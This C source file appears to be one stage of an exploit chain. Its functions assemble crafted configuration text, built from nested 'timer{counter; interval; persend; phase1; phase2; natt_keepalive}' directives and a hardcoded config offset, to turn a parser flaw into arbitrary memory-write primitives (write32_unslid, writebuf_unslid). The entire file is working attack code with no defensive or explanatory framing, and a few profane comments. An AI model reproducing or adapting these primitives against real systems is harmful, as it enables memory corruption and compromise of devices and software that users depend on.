/*
 *  stage1_primitives
 */

#include <stdint.h>
#include <stdio.h>

#include "stage1_primitives.h"
#include "stage0_primitives.h"
#include "ip_tools.h"
#include "common.h"
#include <string.h>
#include "shit.h"

//#define LC_CONF_OFFSET 0xb6088

extern FILE* fp;

char* write32_unslid(uint32_t where,
					 uint32_t what) {
	char* ret = "";
	_asprintf(&ret,
					"%s%s",
			 ret,
			 write32_slid(LC_CONF_OFFSET,
			 			  where - 0xa0));
	_asprintf(&ret,
					"%s"
					"timer{"
					"counter%u;"
					"}",
			 ret,
			 what);

	return ret;
}

char* write32_unslid_pre(uint32_t where) {
	char* ret = "";
	_asprintf(&ret,
					"%s%s",
			 ret,
			 write32_slid(LC_CONF_OFFSET,
			 			  where - 0xa0));
	return ret;
}

char* writebuf_old_unslid(uint32_t where,
						  char*    what,
						  uint32_t len) {
	char* ret = "";
	uint32_t* lol = (uint32_t*)what;

	while (((void*)lol - (void*)what) < len) {
		_asprintf(&ret,
				 "%s%s",
				 ret,
				 write32_unslid_pre(where + ((void*)lol - (void*)what)));

		/*
		 *  i make an exception for 80 cols here
		 */
		
		_asprintf(&ret, "%stimer{", ret);
		
		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%scounter%u;",				ret,	*lol); lol++; }

		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%sinterval%usec;",			ret,	*lol); lol++; }

		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%spersend%u;",				ret,	*lol); lol++; }

		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%sphase1%usec;",			ret,	*lol); lol++; }

		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%sphase2%usec;",			ret,	*lol); lol++; }

		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%snatt_keepalive%usec;",	ret,	*lol); lol++; }
		
		_asprintf(&ret,
				 "%s}",
				 ret);
	}
	
	strcpy(fuck_memory_leaks, ret);

	free(ret);

	return fuck_memory_leaks;

	return ret;
}

char* writebuf_unslid(uint32_t where,
					  char*    what,
					  uint32_t len) {
	char* ret = "";
	uint32_t* lol = (uint32_t*)what;

#if 0
	for (uint32_t here = where; here < where + len; here++) {
		asprintf(&ret,
				 "%s%s",
				 ret,
				 write32_unslid_pre(here));

		asprintf(&ret, "%stimer{counter%u;}", ret, *(uint8_t*)(what + (here - where)));
	}
#endif

#if 1
	while (((void*)lol - (void*)what) < len) {
		_asprintf(&ret,
				 "%s%s",
				 ret,
				 write32_unslid_pre(where + ((void*)lol - (void*)what)));

		/*
		 *  i make an exception for 80 cols here
		 */
		
		_asprintf(&ret, "%stimer{", ret);
	
		
		/*
		 *  this is so fucking ugly
		 */
		if ((((*lol) & 0x80000000) >> 31) == 1) {
lol:
			_asprintf(&ret,
					 "%s}",
					 ret);
			
			for (uint32_t here = ((void*)lol - (void*)what); here < ((void*)lol - (void*)what) + 4; here++) {
				_asprintf(&ret,
						 "%s%s",
						 ret,
						 write32_unslid_pre(here + where));
				_asprintf(&ret, "%stimer{counter%u;}", ret, *(uint8_t*)(what + (here)));
			}

			lol++;
			continue;
		}

		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%scounter%u;",				ret,	*lol); lol++; }

		if ((((*lol) & 0x80000000) >> 31) == 1) goto lol;
		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%sinterval%usec;",			ret,	*lol); lol++; }

		if ((((*lol) & 0x80000000) >> 31) == 1) goto lol;
		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%spersend%u;",				ret,	*lol); lol++; }

		if ((((*lol) & 0x80000000) >> 31) == 1) goto lol;
		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%sphase1%usec;",			ret,	*lol); lol++; }

		if ((((*lol) & 0x80000000) >> 31) == 1) goto lol;
		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%sphase2%usec;",			ret,	*lol); lol++; }

		if ((((*lol) & 0x80000000) >> 31) == 1) goto lol;
		if (((void*)lol - (void*)what) < len) { _asprintf(&ret,	"%snatt_keepalive%usec;",	ret,	*lol); lol++; }
		
		_asprintf(&ret,
				 "%s}",
				 ret);
	}
#endif

	return ret;
}
